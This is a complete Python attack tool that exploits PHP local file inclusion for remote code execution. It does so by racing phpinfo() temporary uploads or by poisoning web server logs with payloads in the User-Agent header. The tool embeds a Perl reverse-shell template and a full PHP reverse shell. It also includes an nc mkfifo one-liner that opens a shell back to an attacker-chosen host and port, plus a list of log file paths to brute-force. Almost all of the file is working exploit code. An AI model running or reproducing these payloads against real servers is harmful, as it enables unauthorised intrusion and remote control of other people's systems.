#!/usr/bin/env python3
# -*- coding: utf8 -*-
import requests
from pprint import pprint
import re
import sys
import argparse
from termcolor import colored
import pyfiglet
import threading
import base64
import random
import string
import time
import socket
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxy set for test
proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}
#http log file paths
LOG_FILES=["/var/log/apache/access.log",
"/var/log/apache/error.log",
"/usr/local/apache/log/error_log",
"/var/log/httpd/access_log",
"/var/log/httpd/access.log",
"/var/log/httpd/error_log",
"/var/log/httpd/_error_log",
"/var/log/httpd/_access_log",
"/etc/httpd/conf/logs/error_log",
"/etc/httpd/logs/error_log",
"/var/log/apache2/_access_log",
"/var/log/apache2/access.log",
"/var/log/apache2/_error.log",
"/var/log/apache2/_error_log",
"/usr/local/apache2/log/error_log",
"/var/log/httpd-access.log",
"/var/log/httpd-access.log",
"/var/log/nginx/error.log",
"/var/log/nginx/access.log",
"/var/log/nginx-access.log",
"/var/log/nginx/mysite.com.access.log",
"/var/log/nginx/mysite.com.error.log",
"/var/log/nginx/%saccess.log",
"/var/log/nginx/%serror.log",
"/var/log/vsftpd.log",
"/var/log/sshd.log"]

## temlate and payloads
template='use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
template2="""<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '%s';
$port = %s;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
  $pid = pcntl_fork();
  if ($pid == -1) {
    printit("ERROR: Can't fork");
    exit(1);
  }
  if ($pid) {
    exit(0);
  }
  if (posix_setsid() == -1) {
    printit("Error: Can't setsid()");
    exit(1);
  }
  $daemon = 1;
} else {
  printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
  printit("$errstr ($errno)");
  exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
  printit("ERROR: Can't spawn shell");
  exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
  if (feof($sock)) {
    printit("ERROR: Shell connection terminated");
    break;
  }
  if (feof($pipes[1])) {
    printit("ERROR: Shell process terminated");
    break;
  }
  $read_a = array($sock, $pipes[1], $pipes[2]);
  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
  if (in_array($sock, $read_a)) {
    if ($debug) printit("SOCK READ");
    $input = fread($sock, $chunk_size);
    if ($debug) printit("SOCK: $input");
    fwrite($pipes[0], $input);
  }
  if (in_array($pipes[1], $read_a)) {
    if ($debug) printit("STDOUT READ");
    $input = fread($pipes[1], $chunk_size);
    if ($debug) printit("STDOUT: $input");
    fwrite($sock, $input);
  }
  if (in_array($pipes[2], $read_a)) {
    if ($debug) printit("STDERR READ");
    $input = fread($pipes[2], $chunk_size);
    if ($debug) printit("STDERR: $input");
    fwrite($sock, $input);
  }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
  if (!$daemon) {
    print "$string\\n";
  }
}
?>"""
TAG="Security Test"
http = urllib3.PoolManager()



def setup(host,phpinfo,PAYLOAD,PADDING,TAG):
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    REQ1="""POST """+phpinfo+"""?a="""+PADDING+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+PADDING+"""\r
HTTP_ACCEPT: """ + PADDING + """\r
HTTP_USER_AGENT: """+PADDING+"""\r
HTTP_ACCEPT_LANGUAGE: """+PADDING+"""\r
HTTP_PRAGMA: """+PADDING+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)

    return (REQ1)


def debug(msg,VERBOSE):
 if (VERBOSE):
   print(colored('[DEBUG] '+msg, "blue"))

def perror(msg):
   print(colored('[ERROR] '+msg, "red"))

def phpInfoLFI(VERBOSE, LFI_PATH,  TAG, reqphp, http, host, port, offset):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  s.send(bytes(reqphp, 'UTF-8'))
  d = b""
  while len(d) < offset:
    d += s.recv(offset)
  try:
    i = d.index(b"[tmp_name] =&gt")
    fn = d[i+17:i+31]
  except ValueError:
    return None
  try:
    d= requests.get(LFI_PATH % fn, verify=False,headers={'Connection':'close'},timeout=10).content
  except requests.exceptions.ReadTimeout:
    return fn
  #d = http.request('GET', LFI_PATH % fn, timeout=5).data
  debug(d,VERBOSE)
  if d.find(bytes(TAG, 'UTF-8')) != -1:
    debug("The rev shell output: "+d,VERBOSE)
    return fn
  else:
    return None

counter=0

class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, t, r, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.payload_type = t
        self.revshell_name = r
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1
            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    if self.payload_type == 3:
                      print(colored("\nGot it! Reverse php Shell created in %s" % self.revshell_name,'green'))
                    else:
                      print(colored("\nGot it! the payload  %s is executed in the remote host" % self.payload_type,"green"))
                    self.event.set()
            except socket.error:
                return
def controll_log(args):
    args=args
    if args.verbose.lower() in ('yes', 'true', 't', 'y', '1'):
      VERBOSE= True
    else:
      VERBOSE= False
    LFI_PATH=args.lfi
    # verify if both urls are reachable
    try:
      if requests.get(LFI_PATH).status_code in (404,403) :
        perror("LFI url path is not reachable !\n")
        sys.exit(1)
    except requests.exceptions.MissingSchema as e:
      perror("LFI url path is not reachable !\n")
      perror(str(e)+"\n")
      sys.exit(1)
    except requests.exceptions.ConnectionError as e:
      perror("LFI url path is not reachable !\n")
      perror(str(e)+"\n")
      sys.exit(1)
    # verify payload input
    if args.ptype <= 0 or args.ptype > 3 :
      perror("Payload parameter should be an integer value: 1 or 2 or 3 !\n")
      sys.exit(1)
    ascii_banner = pyfiglet.figlet_format("R@()Gh1z tool")
    print("")
    print(ascii_banner)
    print(colored('Find all scripts in: https://github.com/roughiz\n\n', "green"))
    print(colored("LFI RCE via controlled log", "green"))
    print("-=" * 50+"\n")
    # define the template to encode
    TEMPLATES ={}
    TEMPLATES[1]=template % (args.lhost,args.lport)
    TEMPLATES[3]=template2 % (args.lhost,args.lport)
    TEMPLATES[2]=""
    base64revshell=base64.b64encode(TEMPLATES[args.ptype].encode())

    # define the end of lfi request
    if args.reqend != "":
       args.reqend="%"+args.reqend
    # setup payloads and lfi and tag
    TAG="Security Test"
    revshell_name='/tmp/'+''.join([random.choice(string.ascii_letters + string.digits) for n in range(12)])+".php"
    PAYLOAD1=""" %s <?php $file = fopen('/tmp/shell.pl', 'w'); fwrite($file,base64_decode('%s')); fclose($file); exec('`which perl` /tmp/shell.pl'); ?>""" % (TAG,base64revshell)
    PAYLOAD2=""" %s<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f') ?>""" % (TAG,args.lhost,args.lport)
    PAYLOAD3=""" %s <?php $file = fopen('%s', 'w'); fwrite($file,base64_decode('%s')); fclose($file); ?>""" % (TAG,revshell_name,base64revshell)
    PAYLOADS= {}
    PAYLOADS[1]=PAYLOAD1
    PAYLOADS[2]=PAYLOAD2
    PAYLOADS[3]=PAYLOAD3
    PAYLOAD=PAYLOADS[args.ptype]
    LFI_PATH+="%s"+args.reqend
    # hostname
    host=args.lfi.split("//")[1].split("/")[0]
    if ":" in host:
      host=host.split(":")[0]
    # inject PAYLOAD into log file
    debug('The payload: '+PAYLOAD,VERBOSE)
    PAYLOAD = PAYLOAD.replace("\r","").replace("\n","")
    debug('The payload: '+PAYLOAD,VERBOSE)
    HEADERS={"User-Agent":PAYLOAD, "From":PAYLOAD, "HTTP_USER_AGENT":PAYLOAD, 'Connection':'close'}
    for i in range(3):
      http.request('GET', args.lfi, headers=HEADERS)
    if args.logfile is not None:
      LOG_FILES.append(args.logfile)
    found=False
    i=0
    file_founded=""
    for file in LOG_FILES:
      i+=1
      sys.stdout.write( "\r% 4d / % 4d" % (i, len(LOG_FILES)))
      sys.stdout.flush()
      if "%s" in file:
        file = file%host
      try:
        req= requests.get(LFI_PATH % file, verify=False,headers={'Connection':'close'},timeout=10)
      except requests.exceptions.ReadTimeout:
        found=True
        file_founded=file
        continue
      except requests.exceptions.ConnectionError:
        found=True
        file_founded=file
        continue
      debug("Response code: "+ str(req.status_code),VERBOSE)
      debug("Response content: "+ str(req.content),VERBOSE)
      d=req.content
      if d.find(TAG.encode()) != -1:
        found=True
        file_founded=file
        break
    if found:
      print(colored("\n\nThe web server log file path is %s" % file_founded,'yellow'))
      if args.ptype == 3:
        print(colored("\nGot it! Reverse php Shell created in %s" % revshell_name,'green'))
        url =LFI_PATH%revshell_name
        print(colored("\nI will execute the reverse shell, requesting the url: "+url,"yellow"))
        try:
          requests.get(url,verify=False,headers={'Connection':'close'},timeout=10)
        except requests.exceptions.ReadTimeout:
          print(colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow"))
      else:
        print(colored("\nGot it! the payload  %s is executed in the remote host" % args.ptype,"green"))
        print(colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow"))
    else:
      print(colored("\n:( The RCE trough controlled Log File script failed !!","red"))

def main(args):
    args = args
    if args.verbose.lower() in ('yes', 'true', 't', 'y', '1'):
      VERBOSE= True
    else:
      VERBOSE= False
    LFI_PATH=args.lfi
    PHPINFO_PATH=args.phpinfo
    # verify if both urls are reachable
    try:
      if requests.get(LFI_PATH).status_code in (404,403) or requests.get(PHPINFO_PATH).status_code in (404,403):
        perror("LFI url path or PHPINFO url path is not reachable !\n")
        sys.exit(1)
    except requests.exceptions.MissingSchema as e:
      perror("LFI url path or PHPINFO url path is not reachable !\n")
      perror(str(e)+"\n")
      sys.exit(1)
    except requests.exceptions.ConnectionError as e:
      perror("LFI url path or PHPINFO url path is not reachable !\n")
      perror(str(e)+"\n")
      sys.exit(1)
    # verify payload input
    if args.ptype <= 0 or args.ptype > 3 :
      perror("Payload parameter should be an integer value: 1 or 2 or 3 !\n")
      sys.exit(1)
    ascii_banner = pyfiglet.figlet_format("R@()Gh1z tool")
    print("")
    print(ascii_banner)
    print(colored('Find all scripts in: https://github.com/roughiz\n\n', "green"))
    print(colored("LFI With PHPInfo() RCE script", "green"))
    print("-=" * 50+"\n")
    poolsz=args.threads

    # define the template to encode
    TEMPLATES ={}
    TEMPLATES[1]=template % (args.lhost,args.lport)
    TEMPLATES[3]=template2 % (args.lhost,args.lport)
    TEMPLATES[2]=""
    #print(TEMPLATES)
    base64revshell=base64.b64encode(bytes(TEMPLATES[args.ptype], 'UTF-8'))

    # define the end of lfi request
    if args.reqend != "":
       args.reqend="%"+args.reqend
    # setup payloads and lfi and tag
    revshell_name='/tmp/'+''.join([random.choice(string.ascii_letters + string.digits) for n in range(12)])+".php"
    PAYLOAD1="""%s\r
<?php $file = fopen("/tmp/shell.pl", "w"); fwrite($file,base64_decode("%s")); fclose($file); exec("`which perl` /tmp/shell.pl &"); ?>\r""" % (TAG,base64revshell)
    PAYLOAD2="""%s\r
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f') ?>\r""" % (TAG,args.lhost,args.lport)
    PAYLOAD3="""%s\r
<?php $file = fopen("%s", "w"); fwrite($file,base64_decode("%s")); fclose($file); ?>\r""" % (TAG,revshell_name,base64revshell)
    PAYLOADS= {}
    PAYLOADS[1]=PAYLOAD1
    PAYLOADS[2]=PAYLOAD2
    PAYLOADS[3]=PAYLOAD3
    PAYLOAD=PAYLOADS[args.ptype]
    LFI_PATH+="%s"+args.reqend

    # phpinfo post params
    PADDING="A" * 5000
    COOKIES= {"PHPSESSID":"q249llvfromc1or39t6tvnun42;","othercookie":PADDING}
    HEADERS= {"HTTP_ACCEPT":PADDING, "HTTP_USER_AGENT":PADDING, "HTTP_ACCEPT_LANGUAGE":PADDING, "HTTP_PRAGMA": PADDING}
    PHPINFO_PATH+='?a='+PADDING
    files = {'file': ('test.txt',PAYLOAD, 'text/plain')}

    debug("\nLFIrequest template : "+LFI_PATH,VERBOSE)
    response = requests.post(PHPINFO_PATH, files=files,headers=HEADERS, cookies=COOKIES)
    i = response.content.find(bytes("[tmp_name] =&gt", 'UTF-8'))
    if i == -1:
      raise ValueError("No php tmp_name in phpinfo output")
    debug("found %s at %i" % (response.content[i:i+10],i),VERBOSE)
    # padded up a bit
    offset= i+256
    if VERBOSE:
      debug("\nPost request template that will be send. url: "+response.request.url,VERBOSE)
      debug("\nPost request template that will be send. headers: "+str(response.request.headers),VERBOSE)

    port = 80
    host=host0=args.phpinfo.split("//")[1].split("/")[0]
    if ":" in host0:
      host=host0.split(":")[0]
      port=int(host0.split(":")[1])
    phpinfo="/"+args.phpinfo.split("//")[1].split("/")[1]
    reqphp= setup(host0,phpinfo,PAYLOAD,PADDING,TAG)
    debug(""+host0+" "+host+" "+str(port),VERBOSE)
    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print(colored("Spawning worker pool (%d)..." % poolsz,"green"))
    tp = []
    payload_type = args.ptype
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, payload_type, revshell_name, VERBOSE, LFI_PATH,  TAG, reqphp, http, host, port, offset))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break

        if e.is_set():
            print(colored("\nYep! The payload works great !","green"))
            if args.ptype == 3:
             url =LFI_PATH%revshell_name
             print(colored("\nI will execute the reverse shell, requesting the url: "+url,"yellow"))
             try:
               requests.get(url,verify=False,headers={'Connection':'close'},timeout=10)
             except requests.exceptions.ReadTimeout:
               print(colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow"))
            else:
              print(colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow"))
        else:
            print(colored(":(",'red'))
    except KeyboardInterrupt:
        print("\nTelling threads to shutdown...")
        e.set()

    print("Shuttin' down...")
    for t in tp:
        t.join()

if __name__=="__main__":
    arg_parser = argparse.ArgumentParser(description='RCE from LFI with PHPINFO assistance or Via controlled log file ')
    arg_parser.add_argument('-a','--action', dest='action', help='Define the attack type\n \t\t - 1 for PHPINFO and - 2 for controlled log. Value 1 by default')
    arg_parser.add_argument('-l','--lfi', dest='lfi', help='the url path of the LFI vuln, per example "http://127.0.0.1:8080/lfi.php?file=" ', type=str, required=True)
    arg_parser.add_argument('--lhost', dest='lhost', help='The local ip to listen, for rev shell', type=str, required=True)
    arg_parser.add_argument('--lport', dest='lport', help='The local port to listen, for rev shell', type=int, required=True)
    arg_parser.add_argument('--payload', dest='ptype', help='Set the type of payload to use.\n 1|2|3  By default payload is set to 3', type=int, default=3)
    arg_parser.add_argument('-e','--end', dest='reqend', help='Define any end of lfi request, per examlpe "%%00"\n by default the end request is empty', type=str, default='')
    arg_parser.add_argument('-v', '--verbose', dest='verbose', help='Define verbose output. set to False by default', type=str, default="FALSE")
    arg_parser.add_argument("-t","--threads", dest="threads", type=int, help="[For phpinfo action]. Threads number, set to 10 by default", default=10)
    arg_parser.add_argument('-i','--phpinfo', dest='phpinfo', help='[For phpinfo action]. Define the url path of the "phpinfo" script. Per ex: "http://host/phpinfo.php"', type=str)#req
    arg_parser.add_argument('-f','--logfile', dest='logfile', help='[For controlled log action]. Define the path of the http server log file. By default script will use bruteforce', type=str)
    action, rem_args = arg_parser.parse_known_args()
    if not action.action or action.action == "1":
      if action.phpinfo is None:
        print("\nlfito_rce.py: error: argument -i/--phpinfo is required")
        sys.exit(1)
      action=True
    elif action.action and action.action == "2":
      action=False
    else:
      arg_parser.error("\nAction should be: 1 for 'PHPINFO' or 2 for 'controlled log'")
    args = arg_parser.parse_args()

    if action:
      main(args)
    else:
      controll_log(args)
